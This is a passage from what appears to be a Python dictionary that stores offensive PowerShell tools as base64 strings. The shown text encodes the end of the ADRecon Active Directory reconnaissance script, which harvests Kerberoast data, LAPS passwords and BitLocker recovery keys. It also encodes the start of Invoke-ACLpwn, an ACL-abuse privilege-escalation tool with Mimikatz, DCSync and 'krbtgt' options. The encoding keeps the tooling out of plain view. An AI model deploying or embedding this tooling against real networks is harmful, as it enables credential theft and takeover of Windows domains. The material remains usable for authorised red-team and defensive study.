ZhcmlhYmxlIEFEUk9iamVjdAogICAgICAgIH0KICAgICAgICBSZW1vdmUtVmFyaWFibGUgQURSRG9tYWluQ29udHJvbGxlcnMKICAgIH0KICAgIElmICgkQURSVXNlcnMpCiAgICB7CiAgICAgICAgV3JpdGUtT3V0cHV0ICJbLV0gVXNlcnMgLSBNYXkgdGFrZSBzb21lIHRpbWUiCiAgICAgICAgJEFEUk9iamVjdCA9IEdldC1BRFJVc2VyIC1Qcm90b2NvbCAkUHJvdG9jb2wgLWRhdGUgJGRhdGUgLW9iakRvbWFpbiAkb2JqRG9tYWluIC1Eb3JtYW50VGltZVNwYW4gJERvcm1hbnRUaW1lU3BhbiAtUGFnZVNpemUgJFBhZ2VTaXplIC1UaHJlYWRzICRUaHJlYWRzCiAgICAgICAgSWYgKCRBRFJPYmplY3QpCiAgICAgICAgewogICAgICAgICAgICBFeHBvcnQtQURSIC1BRFJPYmogJEFEUk9iamVjdCAtQURST3V0cHV0RGlyICRBRFJPdXRwdXREaXIgLU91dHB1dFR5cGUgJE91dHB1dFR5cGUgLUFEUk1vZHVsZU5hbWUgIlVzZXJzIgogICAgICAgICAgICBSZW1vdmUtVmFyaWFibGUgQURST2JqZWN0CiAgICAgICAgfQogICAgICAgIFJlbW92ZS1WYXJpYWJsZSBBRFJVc2VycwogICAgfQogICAgSWYgKCRBRFJVc2VyU1BOcykKICAgIHsKICAgICAgICBXcml0ZS1PdXRwdXQgIlstXSBVc2VyIFNQTnMiCiAgICAgICAgJEFEUk9iamVjdCA9IEdldC1BRFJVc2VyU1BOIC1Qcm90b2NvbCAkUHJvdG9jb2wgLW9iakRvbWFpbiAkb2JqRG9tYWluIC1QYWdlU2l6ZSAkUGFnZVNpemUgLVRocmVhZHMgJFRocmVhZHMKICAgICAgICBJZiAoJEFEUk9iamVjdCkKICAgICAgICB7CiAgICAgICAgICAgIEV4cG9ydC1BRFIgLUFEUk9iaiAkQURST2JqZWN0IC1BRFJPdXRwdXREaXIgJEFEUk91dHB1dERpciAtT3V0cHV0VHlwZSAkT3V0cHV0VHlwZSAtQURSTW9kdWxlTmFtZSAiVXNlclNQTnMiCiAgICAgICAgICAgIFJlbW92ZS1WYXJpYWJsZSBBRFJPYmplY3QKICAgICAgICB9CiAgICAgICAgUmVtb3ZlLVZhcmlhYmxlIEFEUlVzZXJTUE5zCiAgICB9CiAgICBJZiAoJEFEUlBhc3N3b3JkQXR0cmlidXRlcykKICAgIHsKICAgICAgICBXcml0ZS1PdXRwdXQgIlstXSBQYXNzd29yZEF0dHJpYnV0ZXMgLSBFeHBlcmltZW50YWwiCiAgICAgICAgJEFEUk9iamVjdCA9IEdldC1BRFJQYXNzd29yZEF0dHJpYnV0ZXMgLVByb3RvY29sICRQcm90b2NvbCAtb2JqRG9tYWluICRvYmpEb21haW4gLVBhZ2VTaXplICRQYWdlU2l6ZQogICAgICAgIElmICgkQURST2JqZWN0KQogICAgICAgIHsKICAgICAgICAgICAgRXhwb3J0LUFEUiAtQURST2JqICRBRFJPYmplY3QgLUFEUk91dHB1dERpciAkQURST3V0cHV0RGlyIC1PdXRwdXRUeXBlICRPdXRwdXRUeXBlIC1BRFJNb2R1bGVOYW1lICJQYXNzd29yZEF0dHJpYnV0ZXMiCiAgICAgICAgICAgIFJlbW92ZS1WYXJpYWJsZSBBRFJPYmplY3QKICAgICAgICB9CiAgICAgICAgUmVtb3ZlLVZhcmlhYmxlIEFEUlBhc3N3b3JkQXR0cmlidXRlcwogICAgfQogICAgSWYgKCRBRFJHcm91cHMpCiAgICB7CiAgICAgICAgV3JpdGUtT3V0cHV0ICJbLV0gR3JvdXBzIC0gTWF5IHRha2Ugc29tZSB0aW1lIgogICAgICAgICRBRFJPYmplY3QgPSBHZXQtQURSR3JvdXAgLVByb3RvY29sICRQcm90b2NvbCAtb2JqRG9tYWluICRvYmpEb21haW4gLVBhZ2VTaXplICRQYWdlU2l6ZSAtVGhyZWFkcyAkVGhyZWFkcwogICAgICAgIElmICgkQURST2JqZWN0KQogICAgICAgIHsKICAgICAgICAgICAgRXhwb3J0LUFEUiAtQURST2JqICRBRFJPYmplY3QgLUFEUk91dHB1dERpciAkQURST3V0cHV0RGlyIC1PdXRwdXRUeXBlICRPdXRwdXRUeXBlIC1BRFJNb2R1bGVOYW1lICJHcm91cHMiCiAgICAgICAgICAgIFJlbW92ZS1WYXJpYWJsZSBBRFJPYmplY3QKICAgICAgICB9CiAgICAgICAgUmVtb3ZlLVZhcmlhYmxlIEFEUkdyb3VwcwogICAgfQogICAgSWYgKCRBRFJHcm91cE1lbWJlcnMpCiAgICB7CiAgICAgICAgV3JpdGUtT3V0cHV0ICJbLV0gR3JvdXAgTWVtYmVyc2hpcHMgLSBNYXkgdGFrZSBzb21lIHRpbWUiCgogICAgICAgICRBRFJPYmplY3QgPSBHZXQtQURSR3JvdXBNZW1iZXIgLVByb3RvY29sICRQcm90b2NvbCAtb2JqRG9tYWluICRvYmpEb21haW4gLVBhZ2VTaXplICRQYWdlU2l6ZSAtVGhyZWFkcyAkVGhyZWFkcwogICAgICAgIElmICgkQURST2JqZWN0KQogICAgICAgIHsKICAgICAgICAgICAgRXhwb3J0LUFEUiAtQURST2JqICRBRFJPYmplY3QgLUFEUk91dHB1dERpciAkQURST3V0cHV0RGlyIC1PdXRwdXRUeXBlICRPdXRwdXRUeXBlIC1BRFJNb2R1bGVOYW1lICJHcm91cE1lbWJlcnMiCiAgICAgICAgICAgIFJlbW92ZS1WYXJpYWJsZSBBRFJPYmplY3QKICAgICAgICB9CiAgICAgICAgUmVtb3ZlLVZhcmlhYmxlIEFEUkdyb3VwTWVtYmVycwogICAgfQogICAgSWYgKCRBRFJPVXMpCiAgICB7CiAgICAgICAgV3JpdGUtT3V0cHV0ICJbLV0gT3JnYW5pemF0aW9uYWxVbml0cyAoT1VzKSIKICAgICAgICAkQURST2JqZWN0ID0gR2V0LUFEUk9VIC1Qcm90b2NvbCAkUHJvdG9jb2wgLW9iakRvbWFpbiAkb2JqRG9tYWluIC1QYWdlU2l6ZSAkUGFnZVNpemUgLVRocmVhZHMgJFRocmVhZHMKICAgICAgICBJZiAoJEFEUk9iamVjdCkKICAgICAgICB7CiAgICAgICAgICAgIEV4cG9ydC1BRFIgLUFEUk9iaiAkQURST2JqZWN0IC1BRFJPdXRwdXREaXIgJEFEUk91dHB1dERpciAtT3V0cHV0VHlwZSAkT3V0cHV0VHlwZSAtQURSTW9kdWxlTmFtZSAiT1VzIgogICAgICAgICAgICBSZW1vdmUtVmFyaWFibGUgQURST2JqZWN0CiAgICAgICAgfQogICAgICAgIFJlbW92ZS1WYXJpYWJsZSBBRFJPVXMKICAgIH0KICAgIElmICgkQURSR1BPcykKICAgIHsKICAgICAgICBXcml0ZS1PdXRwdXQgIlstXSBHUE9zIgogICAgICAgICRBRFJPYmplY3QgPSBHZXQtQURSR1BPIC1Qcm90b2NvbCAkUHJvdG9jb2wgLW9iakRvbWFpbiAkb2JqRG9tYWluIC1QYWdlU2l6ZSAkUGFnZVNpemUgLVRocmVhZHMgJFRocmVhZHMKICAgICAgICBJZiAoJEFEUk9iamVjdCkKICAgICAgICB7CiAgICAgICAgICAgIEV4cG9ydC1BRFIgLUFEUk9iaiAkQURST2JqZWN0IC1BRFJPdXRwdXREaXIgJEFEUk91dHB1dERpciAtT3V0cHV0VHlwZSAkT3V0cHV0VHlwZSAtQURSTW9kdWxlTmFtZSAiR1BPcyIKICAgICAgICAgICAgUmVtb3ZlLVZhcmlhYmxlIEFEUk9iamVjdAogICAgICAgIH0KICAgICAgICBSZW1vdmUtVmFyaWFibGUgQURSR1BPcwogICAgfQogICAgSWYgKCRBRFJnUExpbmtzKQogICAgewogICAgICAgIFdyaXRlLU91dHB1dCAiWy1dIGdQTGlua3MgLSBTY29wZSBvZiBNYW5hZ2VtZW50IChTT00pIgogICAgICAgICRBRFJPYmplY3QgPSBHZXQtQURSZ1BMaW5rIC1Qcm90b2NvbCAkUHJvdG9jb2wgLW9iakRvbWFpbiAkb2JqRG9tYWluIC1QYWdlU2l6ZSAkUGFnZVNpemUgLVRocmVhZHMgJFRocmVhZHMKICAgICAgICBJZiAoJEFEUk9iamVjdCkKICAgICAgICB7CiAgICAgICAgICAgIEV4cG9ydC1BRFIgLUFEUk9iaiAkQURST2JqZWN0IC1BRFJPdXRwdXREaXIgJEFEUk91dHB1dERpciAtT3V0cHV0VHlwZSAkT3V0cHV0VHlwZSAtQURSTW9kdWxlTmFtZSAiZ1BMaW5rcyIKICAgICAgICAgICAgUmVtb3ZlLVZhcmlhYmxlIEFEUk9iamVjdAogICAgICAgIH0KICAgICAgICBSZW1vdmUtVmFyaWFibGUgQURSZ1BMaW5rcwogICAgfQogICAgSWYgKCRBRFJETlNab25lcykKICAgIHsKICAgICAgICBXcml0ZS1PdXRwdXQgIlstXSBETlMgWm9uZXMgYW5kIFJlY29yZHMiCiAgICAgICAgR2V0LUFEUkROU1pvbmUgLVByb3RvY29sICRQcm90b2NvbCAtQURST3V0cHV0RGlyICRBRFJPdXRwdXREaXIgLW9iakRvbWFpbiAkb2JqRG9tYWluIC1Eb21haW5Db250cm9sbGVyICREb21haW5Db250cm9sbGVyIC1DcmVkZW50aWFsICRDcmVkZW50aWFsIC1QYWdlU2l6ZSAkUGFnZVNpemUgLU91dHB1dFR5cGUgJE91dHB1dFR5cGUKICAgICAgICBSZW1vdmUtVmFyaWFibGUgQURSRE5TWm9uZXMKICAgIH0KICAgIElmICgkQURSUHJpbnRlcnMpCiAgICB7CiAgICAgICAgV3JpdGUtT3V0cHV0ICJbLV0gUHJpbnRlcnMiCiAgICAgICAgJEFEUk9iamVjdCA9IEdldC1BRFJQcmludGVyIC1Qcm90b2NvbCAkUHJvdG9jb2wgLW9iakRvbWFpbiAkb2JqRG9tYWluIC1QYWdlU2l6ZSAkUGFnZVNpemUgLVRocmVhZHMgJFRocmVhZHMKICAgICAgICBJZiAoJEFEUk9iamVjdCkKICAgICAgICB7CiAgICAgICAgICAgIEV4cG9ydC1BRFIgLUFEUk9iaiAkQURST2JqZWN0IC1BRFJPdXRwdXREaXIgJEFEUk91dHB1dERpciAtT3V0cHV0VHlwZSAkT3V0cHV0VHlwZSAtQURSTW9kdWxlTmFtZSAiUHJpbnRlcnMiCiAgICAgICAgICAgIFJlbW92ZS1WYXJpYWJsZSBBRFJPYmplY3QKICAgICAgICB9CiAgICAgICAgUmVtb3ZlLVZhcmlhYmxlIEFEUlByaW50ZXJzCiAgICB9CiAgICBJZiAoJEFEUkNvbXB1dGVycykKICAgIHsKICAgICAgICBXcml0ZS1PdXRwdXQgIlstXSBDb21wdXRlcnMgLSBNYXkgdGFrZSBzb21lIHRpbWUiCiAgICAgICAgJEFEUk9iamVjdCA9IEdldC1BRFJDb21wdXRlciAtUHJvdG9jb2wgJFByb3RvY29sIC1kYXRlICRkYXRlIC1vYmpEb21haW4gJG9iakRvbWFpbiAtRG9ybWFudFRpbWVTcGFuICREb3JtYW50VGltZVNwYW4gLVBhc3NNYXhBZ2UgJFBhc3NNYXhBZ2UgLVBhZ2VTaXplICRQYWdlU2l6ZSAtVGhyZWFkcyAkVGhyZWFkcwogICAgICAgIElmICgkQURST2JqZWN0KQogICAgICAgIHsKICAgICAgICAgICAgRXhwb3J0LUFEUiAtQURST2JqICRBRFJPYmplY3QgLUFEUk91dHB1dERpciAkQURST3V0cHV0RGlyIC1PdXRwdXRUeXBlICRPdXRwdXRUeXBlIC1BRFJNb2R1bGVOYW1lICJDb21wdXRlcnMiCiAgICAgICAgICAgIFJlbW92ZS1WYXJpYWJsZSBBRFJPYmplY3QKICAgICAgICB9CiAgICAgICAgUmVtb3ZlLVZhcmlhYmxlIEFEUkNvbXB1dGVycwogICAgfQogICAgSWYgKCRBRFJDb21wdXRlclNQTnMpCiAgICB7CiAgICAgICAgV3JpdGUtT3V0cHV0ICJbLV0gQ29tcHV0ZXIgU1BOcyIKICAgICAgICAkQURST2JqZWN0ID0gR2V0LUFEUkNvbXB1dGVyU1BOIC1Qcm90b2NvbCAkUHJvdG9jb2wgLW9iakRvbWFpbiAkb2JqRG9tYWluIC1QYWdlU2l6ZSAkUGFnZVNpemUgLVRocmVhZHMgJFRocmVhZHMKICAgICAgICBJZiAoJEFEUk9iamVjdCkKICAgICAgICB7CiAgICAgICAgICAgIEV4cG9ydC1BRFIgLUFEUk9iaiAkQURST2JqZWN0IC1BRFJPdXRwdXREaXIgJEFEUk91dHB1dERpciAtT3V0cHV0VHlwZSAkT3V0cHV0VHlwZSAtQURSTW9kdWxlTmFtZSAiQ29tcHV0ZXJTUE5zIgogICAgICAgICAgICBSZW1vdmUtVmFyaWFibGUgQURST2JqZWN0CiAgICAgICAgfQogICAgICAgIFJlbW92ZS1WYXJpYWJsZSBBRFJDb21wdXRlclNQTnMKICAgIH0KICAgIElmICgkQURSTEFQUykKICAgIHsKICAgICAgICBXcml0ZS1PdXRwdXQgIlstXSBMQVBTIC0gTmVlZHMgUHJpdmlsZWdlZCBBY2NvdW50IgogICAgICAgICRBRFJPYmplY3QgPSBHZXQtQURSTEFQU0NoZWNrIC1Qcm90b2NvbCAkUHJvdG9jb2wgLW9iakRvbWFpbiAkb2JqRG9tYWluIC1QYWdlU2l6ZSAkUGFnZVNpemUgLVRocmVhZHMgJFRocmVhZHMKICAgICAgICBJZiAoJEFEUk9iamVjdCkKICAgICAgICB7CiAgICAgICAgICAgIEV4cG9ydC1BRFIgLUFEUk9iaiAkQURST2JqZWN0IC1BRFJPdXRwdXREaXIgJEFEUk91dHB1dERpciAtT3V0cHV0VHlwZSAkT3V0cHV0VHlwZSAtQURSTW9kdWxlTmFtZSAiTEFQUyIKICAgICAgICAgICAgUmVtb3ZlLVZhcmlhYmxlIEFEUk9iamVjdAogICAgICAgIH0KICAgICAgICBSZW1vdmUtVmFyaWFibGUgQURSTEFQUwogICAgfQogICAgSWYgKCRBRFJCaXRMb2NrZXIpCiAgICB7CiAgICAgICAgV3JpdGUtT3V0cHV0ICJbLV0gQml0TG9ja2VyIFJlY292ZXJ5IEtleXMgLSBOZWVkcyBQcml2aWxlZ2VkIEFjY291bnQiCiAgICAgICAgJEFEUk9iamVjdCA9IEdldC1BRFJCaXRMb2NrZXIgLVByb3RvY29sICRQcm90b2NvbCAtb2JqRG9tYWluICRvYmpEb21haW4gLURvbWFpbkNvbnRyb2xsZXIgJERvbWFpbkNvbnRyb2xsZXIgLUNyZWRlbnRpYWwgJENyZWRlbnRpYWwKICAgICAgICBJZiAoJEFEUk9iamVjdCkKICAgICAgICB7CiAgICAgICAgICAgIEV4cG9ydC1BRFIgLUFEUk9iaiAkQURST2JqZWN0IC1BRFJPdXRwdXREaXIgJEFEUk91dHB1dERpciAtT3V0cHV0VHlwZSAkT3V0cHV0VHlwZSAtQURSTW9kdWxlTmFtZSAiQml0TG9ja2VyUmVjb3ZlcnlLZXlzIgogICAgICAgICAgICBSZW1vdmUtVmFyaWFibGUgQURST2JqZWN0CiAgICAgICAgfQogICAgICAgIFJlbW92ZS1WYXJpYWJsZSBBRFJCaXRMb2NrZXIKICAgIH0KICAgIElmICgkQURSQUNMcykKICAgIHsKICAgICAgICBXcml0ZS1PdXRwdXQgIlstXSBBQ0xzIC0gTWF5IHRha2Ugc29tZSB0aW1lIgogICAgICAgICRBRFJPYmplY3QgPSBHZXQtQURSQUNMIC1Qcm90b2NvbCAkUHJvdG9jb2wgLW9iakRvbWFpbiAkb2JqRG9tYWluIC1Eb21haW5Db250cm9sbGVyICREb21haW5Db250cm9sbGVyIC1DcmVkZW50aWFsICRDcmVkZW50aWFsIC1QYWdlU2l6ZSAkUGFnZVNpemUgLVRocmVhZHMgJFRocmVhZHMKICAgICAgICBSZW1vdmUtVmFyaWFibGUgQURSQUNMcwogICAgfQogICAgSWYgKCRBRFJHUE9SZXBvcnQpCiAgICB7CiAgICAgICAgV3JpdGUtT3V0cHV0ICJbLV0gR1BPUmVwb3J0IC0gTWF5IHRha2Ugc29tZSB0aW1lIgogICAgICAgIEdldC1BRFJHUE9SZXBvcnQgLVByb3RvY29sICRQcm90b2NvbCAtVXNlQWx0Q3JlZHMgJFVzZUFsdENyZWRzIC1BRFJPdXRwdXREaXIgJEFEUk91dHB1dERpcgogICAgICAgIFJlbW92ZS1WYXJpYWJsZSBBRFJHUE9SZXBvcnQKICAgIH0KICAgIElmICgkQURSS2VyYmVyb2FzdCkKICAgIHsKICAgICAgICBXcml0ZS1PdXRwdXQgIlstXSBLZXJiZXJvYXN0IgogICAgICAgICRBRFJPYmplY3QgPSBHZXQtQURSS2VyYmVyb2FzdCAtUHJvdG9jb2wgJFByb3RvY29sIC1vYmpEb21haW4gJG9iakRvbWFpbiAtQ3JlZGVudGlhbCAkQ3JlZGVudGlhbCAtUGFnZVNpemUgJFBhZ2VTaXplCiAgICAgICAgSWYgKCRBRFJPYmplY3QpCiAgICAgICAgewogICAgICAgICAgICBFeHBvcnQtQURSIC1BRFJPYmogJEFEUk9iamVjdCAtQURST3V0cHV0RGlyICRBRFJPdXRwdXREaXIgLU91dHB1dFR5cGUgJE91dHB1dFR5cGUgLUFEUk1vZHVsZU5hbWUgIktlcmJlcm9hc3QiCiAgICAgICAgICAgIFJlbW92ZS1WYXJpYWJsZSBBRFJPYmplY3QKICAgICAgICB9CiAgICAgICAgUmVtb3ZlLVZhcmlhYmxlIEFEUktlcmJlcm9hc3QKICAgIH0KICAgIElmICgkQURSRG9tYWluQWNjb3VudHN1c2VkZm9yU2VydmljZUxvZ29uKQogICAgewogICAgICAgIFdyaXRlLU91dHB1dCAiWy1dIERvbWFpbiBBY2NvdW50cyB1c2VkIGZvciBTZXJ2aWNlIExvZ29uIC0gTmVlZHMgUHJpdmlsZWdlZCBBY2NvdW50IgogICAgICAgICRBRFJPYmplY3QgPSBHZXQtQURSRG9tYWluQWNjb3VudHN1c2VkZm9yU2VydmljZUxvZ29uIC1Qcm90b2NvbCAkUHJvdG9jb2wgLW9iakRvbWFpbiAkb2JqRG9tYWluIC1DcmVkZW50aWFsICRDcmVkZW50aWFsIC1QYWdlU2l6ZSAkUGFnZVNpemUgLVRocmVhZHMgJFRocmVhZHMKICAgICAgICBJZiAoJEFEUk9iamVjdCkKICAgICAgICB7CiAgICAgICAgICAgIEV4cG9ydC1BRFIgLUFEUk9iaiAkQURST2JqZWN0IC1BRFJPdXRwdXREaXIgJEFEUk91dHB1dERpciAtT3V0cHV0VHlwZSAkT3V0cHV0VHlwZSAtQURSTW9kdWxlTmFtZSAiRG9tYWluQWNjb3VudHN1c2VkZm9yU2VydmljZUxvZ29uIgogICAgICAgICAgICBSZW1vdmUtVmFyaWFibGUgQURST2JqZWN0CiAgICAgICAgfQogICAgICAgIFJlbW92ZS1WYXJpYWJsZSBBRFJEb21haW5BY2NvdW50c3VzZWRmb3JTZXJ2aWNlTG9nb24KICAgIH0KCiAgICAkVG90YWxUaW1lID0gInswOk4yfSIgLWYgKChHZXQtRGF0ZURpZmYgLURhdGUxIChHZXQtRGF0ZSkgLURhdGUyICRkYXRlKS5Ub3RhbE1pbnV0ZXMpCgogICAgJEFib3V0QURSZWNvbiA9IEdldC1BRFJBYm91dCAtUHJvdG9jb2wgJFByb3RvY29sIC1kYXRlICRkYXRlIC1BRFJlY29uVmVyc2lvbiAkQURSZWNvblZlcnNpb24gLUNyZWRlbnRpYWwgJENyZWRlbnRpYWwgLVJhbm9uQ29tcHV0ZXIgJFJhbm9uQ29tcHV0ZXIgLVRvdGFsVGltZSAkVG90YWxUaW1lCgogICAgSWYgKCAoJE91dHB1dFR5cGUgLUNvbnRhaW5zICJDU1YiKSAtb3IgKCRPdXRwdXRUeXBlIC1Db250YWlucyAiWE1MIikgLW9yICgkT3V0cHV0VHlwZSAtQ29udGFpbnMgIkpTT04iKSAtb3IgKCRPdXRwdXRUeXBlIC1Db250YWlucyAiSFRNTCIpICkKICAgIHsKICAgICAgICBJZiAoJEFib3V0QURSZWNvbikKICAgICAgICB7CiAgICAgICAgICAgIEV4cG9ydC1BRFIgLUFEUk9iaiAkQWJvdXRBRFJlY29uIC1BRFJPdXRwdXREaXIgJEFEUk91dHB1dERpciAtT3V0cHV0VHlwZSAkT3V0cHV0VHlwZSAtQURSTW9kdWxlTmFtZSAiQWJvdXRBRFJlY29uIgogICAgICAgIH0KICAgICAgICBXcml0ZS1PdXRwdXQgIlsqXSBUb3RhbCBFeGVjdXRpb24gVGltZSAobWlucyk6ICQoJFRvdGFsVGltZSkiCiAgICAgICAgV3JpdGUtT3V0cHV0ICJbKl0gT3V0cHV0IERpcmVjdG9yeTogJEFEUk91dHB1dERpciIKICAgICAgICAkQURSU1RET1VUID0gJGZhbHNlCiAgICB9CgogICAgU3dpdGNoICgkT3V0cHV0VHlwZSkKICAgIHsKICAgICAgICAnU1RET1VUJwogICAgICAgIHsKICAgICAgICAgICAgSWYgKCRBRFJTVERPVVQpCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIFdyaXRlLU91dHB1dCAiWypdIFRvdGFsIEV4ZWN1dGlvbiBUaW1lIChtaW5zKTogJCgkVG90YWxUaW1lKSIKICAgICAgICAgICAgfQogICAgICAgIH0KICAgICAgICAnSFRNTCcKICAgICAgICB7CiAgICAgICAgICAgIEV4cG9ydC1BRFIgLUFEUk9iaiAkKE5ldy1PYmplY3QgUFNPYmplY3QpIC1BRFJPdXRwdXREaXIgJEFEUk91dHB1dERpciAtT3V0cHV0VHlwZSAkKFthcnJheV0gIkhUTUwiKSAtQURSTW9kdWxlTmFtZSAiSW5kZXgiCiAgICAgICAgfQogICAgICAgICdFWENFTCcKICAgICAgICB7CiAgICAgICAgICAgIEV4cG9ydC1BRFJFeGNlbCAkQURST3V0cHV0RGlyCiAgICAgICAgfQogICAgfQogICAgUmVtb3ZlLVZhcmlhYmxlIFRvdGFsVGltZQogICAgUmVtb3ZlLVZhcmlhYmxlIEFib3V0QURSZWNvbgogICAgU2V0LUxvY2F0aW9uICRyZXR1cm5kaXIKICAgIFJlbW92ZS1WYXJpYWJsZSByZXR1cm5kaXIKCiAgICBJZiAoKCRQcm90b2NvbCAtZXEgJ0FEV1MnKSAtYW5kICRVc2VBbHRDcmVkcykKICAgIHsKICAgICAgICBSZW1vdmUtUFNEcml2ZSBBRFIKICAgIH0KCiAgICBJZiAoJFByb3RvY29sIC1lcSAnTERBUCcpCiAgICB7CiAgICAgICAgJG9iakRvbWFpbi5EaXNwb3NlKCkKICAgICAgICAkb2JqRG9tYWluUm9vdERTRS5EaXNwb3NlKCkKICAgIH0KCiAgICBJZiAoJEFEUk91dHB1dERpcikKICAgIHsKICAgICAgICBSZW1vdmUtRW1wdHlBRFJPdXRwdXREaXIgJEFEUk91dHB1dERpciAkT3V0cHV0VHlwZQogICAgfQoKICAgIFJlbW92ZS1WYXJpYWJsZSBBRFJlY29uVmVyc2lvbgogICAgUmVtb3ZlLVZhcmlhYmxlIFJhbm9uQ29tcHV0ZXIKfQoKSWYgKCRMb2cpCnsKICAgIFN0YXJ0LVRyYW5zY3JpcHQgLVBhdGggIiQoR2V0LUxvY2F0aW9uKVxBRFJlY29uLUNvbnNvbGUtTG9nLnR4dCIKfQoKSW52b2tlLUFEUmVjb24gLUdlbkV4Y2VsICRHZW5FeGNlbCAtUHJvdG9jb2wgJFByb3RvY29sIC1Db2xsZWN0ICRDb2xsZWN0IC1Eb21haW5Db250cm9sbGVyICREb21haW5Db250cm9sbGVyIC1DcmVkZW50aWFsICRDcmVkZW50aWFsIC1PdXRwdXRUeXBlICRPdXRwdXRUeXBlIC1BRFJPdXRwdXREaXIgJE91dHB1dERpciAtRG9ybWFudFRpbWVTcGFuICREb3JtYW50VGltZVNwYW4gLVBhc3NNYXhBZ2UgJFBhc3NNYXhBZ2UgLVBhZ2VTaXplICRQYWdlU2l6ZSAtVGhyZWFkcyAkVGhyZWFkcwoKSWYgKCRMb2cpCnsKICAgIFN0b3AtVHJhbnNjcmlwdAp9Cg==',  # Base64-encoded ADRecon script
    'invoke-aclpwn': 'IyMjIFdyaXR0ZW4gYnkgUmluZGVydCBLcmFtZXIKCiMjIyMjIyMjIyMjIyMjIyMjIyMjCiMKIyBDb3B5cmlnaHQgKGMpIDIwMTggRm94LUlUCiMKIyBQZXJtaXNzaW9uIGlzIGhlcmVieSBncmFudGVkLCBmcmVlIG9mIGNoYXJnZSwgdG8gYW55IHBlcnNvbiBvYnRhaW5pbmcgYSBjb3B5CiMgb2YgdGhpcyBzb2Z0d2FyZSBhbmQgYXNzb2NpYXRlZCBkb2N1bWVudGF0aW9uIGZpbGVzICh0aGUgIlNvZnR3YXJlIiksIHRvIGRlYWwKIyBpbiB0aGUgU29mdHdhcmUgd2l0aG91dCByZXN0cmljdGlvbiwgaW5jbHVkaW5nIHdpdGhvdXQgbGltaXRhdGlvbiB0aGUgcmlnaHRzCiMgdG8gdXNlLCBjb3B5LCBtb2RpZnksIG1lcmdlLCBwdWJsaXNoLCBkaXN0cmlidXRlLCBzdWJsaWNlbnNlLCBhbmQvb3Igc2VsbAojIGNvcGllcyBvZiB0aGUgU29mdHdhcmUsIGFuZCB0byBwZXJtaXQgcGVyc29ucyB0byB3aG9tIHRoZSBTb2Z0d2FyZSBpcwojIGZ1cm5pc2hlZCB0byBkbyBzbywgc3ViamVjdCB0byB0aGUgZm9sbG93aW5nIGNvbmRpdGlvbnM6CiMKIyBUaGUgYWJvdmUgY29weXJpZ2h0IG5vdGljZSBhbmQgdGhpcyBwZXJtaXNzaW9uIG5vdGljZSBzaGFsbCBiZSBpbmNsdWRlZCBpbiBhbGwKIyBjb3BpZXMgb3Igc3Vic3RhbnRpYWwgcG9ydGlvbnMgb2YgdGhlIFNvZnR3YXJlLgojCiMgVEhFIFNPRlRXQVJFIElTIFBST1ZJREVEICJBUyBJUyIsIFdJVEhPVVQgV0FSUkFOVFkgT0YgQU5ZIEtJTkQsIEVYUFJFU1MgT1IKIyBJTVBMSUVELCBJTkNMVURJTkcgQlVUIE5PVCBMSU1JVEVEIFRPIFRIRSBXQVJSQU5USUVTIE9GIE1FUkNIQU5UQUJJTElUWSwKIyBGSVRORVNTIEZPUiBBIFBBUlRJQ1VMQVIgUFVSUE9TRSBBTkQgTk9OSU5GUklOR0VNRU5ULiBJTiBOTyBFVkVOVCBTSEFMTCBUSEUKIyBBVVRIT1JTIE9SIENPUFlSSUdIVCBIT0xERVJTIEJFIExJQUJMRSBGT1IgQU5ZIENMQUlNLCBEQU1BR0VTIE9SIE9USEVSCiMgTElBQklMSVRZLCBXSEVUSEVSIElOIEFOIEFDVElPTiBPRiBDT05UUkFDVCwgVE9SVCBPUiBPVEhFUldJU0UsIEFSSVNORyBGUk9NLAojIE9VVCBPRiBPUiBJTiBDT05ORUNUSU9OIFdJVEggVEhFIFNPRlRXQVJFIE9SIFRIRSBVU0UgT1IgT1RIRVIgREVBTElOR1MgSU4gVEhFCiMgU09GVFdBUkUuCiMKIyMjIyMjIyMjIyMjIyMjIyMjIyMKCiMgdGh4OiBodHRwczovL2dpdGh1Yi5jb20vTmlja29sYWpBL1Bvd2VyU2hlbGwvYmxvYi9tYXN0ZXIvQXp1cmVBRC9TZXQtQUFEU3luY1Blcm1pc3Npb25zLnBzMQojIHRoeDogaHR0cHM6Ly9zb2NpYWwudGVjaG5ldC5taWNyb3NvZnQuY29tL0ZvcnVtcy9pZS9lbi1VUy9mMjM4ZDJiMC1hMWQ3LTQ4ZTgtOGE2MC01NDJlN2NjZmEyZTgvcmVjdXJzaXZlLXJldHJpZXZhbC1vZi1hbGwtYWQtZ3JvdXAtbWVtYmVyc2hpcHMtb2YtYS11c2VyP2ZvcnVtPUlUQ0cKIyB0aHg6IGh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9jYW5peDEvQURBQ0xTY2FubmVyL21hc3Rlci9BREFDTFNjYW4ucHMxCiMgdGh4OiBodHRwczovL2Jsb2dzLm1zZG4ubWljcm9zb2Z0LmNvbS9kc2Fkc2kvMjAxMy8wNy8wOS9zZXR0aW5nLWFjdGl2ZS1kaXJlY3Rvcnktb2JqZWN0LXBlcm1pc3Npb25zLXVzaW5nLXBvd2Vyc2hlbGwtYW5kLXN5c3RlbS1kaXJlY3RvcnlzZXJ2aWNlcy8KCltDbWRsZXRCaW5kaW5nKCldCltBbGlhcygpXQpbT3V0cHV0VHlwZShbaW50XSldClBhcmFtCigKICAgIFtzdHJpbmddJGRvbWFpbiwKICAgIFtzdHJpbmddJHVzZXJuYW1lLAogICAgW3N0cmluZ10kcGFzc3dvcmQsICAgIAogICAgW3N0cmluZ10kcHJvdG9jb2wgPSAnTERBUCcsCiAgICBbc3RyaW5nXSRwb3J0ID0gMzg5LAogICAgW3N3aXRjaF0kV2hhdElmLAogICAgW3N3aXRjaF0kTm9TZWNDbGVhbnVwLAogICAgW3N3aXRjaF0kTm9EQ1N5bmMsCiAgICBbc3RyaW5nXSRtaW1pS2F0ekxvY2F0aW9uLAogICAgW3N0cmluZ10kU2hhcnBIb3VuZExvY2F0aW9uLAogICAgW3N0cmluZ10kdXNlckFjY291bnRUb1B3biA9ICdrcmJ0Z3QnLAogICAgW3N3aXRjaF0kbG9nVG9GaWxlICAgCikKCiNyZWdpb24gQURGdW5jdGlvbnMKCgojQWRkcyB1c2VycyB0byBnaXZlbiBncm91cApmdW5jdGlvbiBTZXQtR3JvdXBNZW1iZXJzaGlwICgkZ3JvdXBETiwgW3N3aXRjaF0kUmVtb3ZlKSB7CgogICAgaWYgKCRnbG9iYWw6bGRhcENvbm5JbmZvLkludGVncmF0ZWRfTG9naW4pewogICAgICAgICRwcmluY2lwYWxDb250ZXh0ID0gTmV3LU9iamVjdCBTeXN0ZW0u